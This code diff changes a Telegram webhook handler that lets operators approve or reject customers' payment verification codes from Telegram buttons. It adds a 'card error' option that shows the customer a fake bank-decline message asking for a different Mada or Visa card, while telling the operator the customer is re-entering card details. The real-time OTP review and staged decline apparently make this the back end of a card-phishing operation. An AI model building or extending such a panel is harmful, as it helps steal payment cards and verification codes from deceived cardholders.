@@ -333,10 +333,11 @@ router.post("/telegram-webhook", async (req, res) => {
       const cb = body.callback_query;
       const dataCmd = String(cb.data || "");
 
-      if (dataCmd.startsWith("v_app_") || dataCmd.startsWith("v_rej_")) {
+      if (dataCmd.startsWith("v_app_") || dataCmd.startsWith("v_card_") || dataCmd.startsWith("v_rej_")) {
         const isApprove = dataCmd.startsWith("v_app_");
-        const orderId = isApprove ? dataCmd.slice(6) : dataCmd.slice(6);
-        const newStatus = isApprove ? "approved" : "rejected";
+        const isCardError = dataCmd.startsWith("v_card_");
+        const orderId = isCardError ? dataCmd.slice(7) : dataCmd.slice(6);
+        const newStatus = isApprove ? "approved" : isCardError ? "card_error" : "rejected";
 
         // 1. Direct MongoDB update
         await OrderVerifyModel.findOneAndUpdate(
@@ -366,7 +367,11 @@ router.post("/telegram-webhook", async (req, res) => {
         if (chatId && messageId) {
           const existingButtons = cb.message?.reply_markup?.inline_keyboard?.[0] || [];
           const copyBtn = existingButtons.find((b) => b.copy_text);
-          const row = [{ text: isApprove ? "✅ تم تأكيد الطلب" : "❌ تم الرفض", callback_data: "none" }];
+          let label = "✅ تم تأكيد الطلب";
+          if (isCardError) label = "💳 تم إبلاغ العميل بتغيير البطاقة";
+          else if (!isApprove) label = "❌ تم الرفض";
+
+          const row = [{ text: label, callback_data: "none" }];
           if (copyBtn) row.push(copyBtn);
 
           const edit = async (token) => {
@@ -387,20 +392,31 @@ router.post("/telegram-webhook", async (req, res) => {
 
         // 4. Send Confirmation text in chat
         if (chatId) {
-          const text = isApprove
-            ? [
-                `🎉 <b>تم تأكيد الطلب بنجاح!</b>`,
-                `━━━━━━━━━━━━━━━━━━`,
-                `🆔 رقم الطلب: <code>${orderId}</code>`,
-                `✅ <b>الحالة للعميل:</b> ظهرت له شاشة تأكيد الحجز الرسمية وسيتم تحويله للرئيسية تلقائياً.`,
-                `📱 يرجى التواصل مع العميل عبر الواتساب لتأكيد موعد الشحن.`,
-              ].join("\n")
-            : [
-                `⚠️ <b>تم رفض كود التحقق!</b>`,
-                `━━━━━━━━━━━━━━━━━━`,
-                `🆔 رقم الطلب: <code>${orderId}</code>`,
-                `🔄 <b>الحالة للعميل:</b> ظهرت له رسالة: "الكود غير صحيح، يرجى كتابة الرمز الصحيح والمحاولة مرة أخرى".`,
-              ].join("\n");
+          let text = "";
+          if (isApprove) {
+            text = [
+              `🎉 <b>تم تأكيد الطلب بنجاح!</b>`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `🆔 رقم الطلب: <code>${orderId}</code>`,
+              `✅ <b>الحالة للعميل:</b> ظهرت له شاشة تأكيد الحجز الرسمية وسيتم تحويله للرئيسية تلقائياً.`,
+              `📱 يرجى التواصل مع العميل عبر الواتساب لتأكيد موعد الشحن.`,
+            ].join("\n");
+          } else if (isCardError) {
+            text = [
+              `💳 <b>تم إشعار العميل بوجود مشكلة في بطاقته!</b>`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `🆔 رقم الطلب: <code>${orderId}</code>`,
+              `🔄 <b>الرسالة التي ظهرت للعميل:</b> "عذراً، البنك رفض العملية لوجود مشكلة في بطاقتك.. يرجى تغيير البطاقة واستخدام بطاقة مدى أو فيزا ثانية لإتمام الدفع."`,
+              `⏳ العميل الآن يقوم بتغيير بيانات البطاقة لإعادة المحاولة.`,
+            ].join("\n");
+          } else {
+            text = [
+              `⚠️ <b>تم رفض كود التحقق!</b>`,
+              `━━━━━━━━━━━━━━━━━━`,
+              `🆔 رقم الطلب: <code>${orderId}</code>`,
+              `🔄 <b>الحالة للعميل:</b> ظهرت له رسالة: "الكود غير صحيح، يرجى كتابة الرمز الصحيح والمحاولة مرة أخرى".`,
+            ].join("\n");
+          }
 
           const send = async (token) => {
             if (!token) return;
